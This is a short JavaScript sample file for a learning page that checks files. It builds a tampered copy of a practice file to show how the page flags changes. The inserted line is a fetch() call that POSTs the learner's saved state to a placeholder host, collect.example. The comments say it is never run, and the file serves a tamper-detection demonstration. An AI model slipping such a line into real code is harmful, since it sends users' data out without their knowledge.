// A sample for "Check a file" (packets-verify.html): the sample practice file with one line added to its script,
// to show what the page reports for a file that was changed. The added line is written to send the learner's work
// to another computer. Its address is made up (names that end in .example are set aside for examples), and nothing
// on the page ever runs this text.
(function (root) {
  var samples = root.AlloPacketSamples = root.AlloPacketSamples || {};
  var ADDED = "win.fetch('https://collect.example/results', { method: 'POST', body: JSON.stringify(state) });";
  var BEFORE = '\nvar renders=';
  samples.changed = function () {
    var from = samples.practice;
    var at = from ? from.text.indexOf(BEFORE) : -1;
    if (at < 0) return null;
    return { name: 'sample-changed-file.html', text: from.text.slice(0, at) + '\n' + ADDED + from.text.slice(at) };
  };
})(typeof window !== 'undefined' ? window : globalThis);
